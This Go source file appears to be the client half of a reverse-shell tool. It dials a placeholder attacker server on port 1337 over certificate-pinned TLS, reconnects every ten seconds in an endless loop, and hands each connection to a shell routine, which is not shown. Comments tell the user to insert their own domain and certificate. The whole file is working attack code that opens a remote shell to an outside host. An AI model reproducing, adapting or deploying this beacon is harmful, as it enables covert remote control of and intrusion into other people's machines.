// +build notor

package client

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"time"
)

const (
	// serverDomain needs to be changed to your address
	serverDomain = "domain.tld"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert needs to be changed to the TLS certificate of the server
// intendation breaks the certificate
const serverCert = `-----BEGIN CERTIFICATE-----
____ CERTIFICATE GOES HERE | DONT INDENT ____
-----END CERTIFICATE-----`

type connection struct {
	Conn    net.Conn
	Sysinfo string
}

func connect() (net.Conn, error) {
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	log.Println("connect")
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

func NetClient() {
	log.Println("NetClient")
	for {
		conn, err := connect()
		if err != nil {
			log.Println("Could not connect:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
		time.Sleep(10 * time.Second)
	}
}
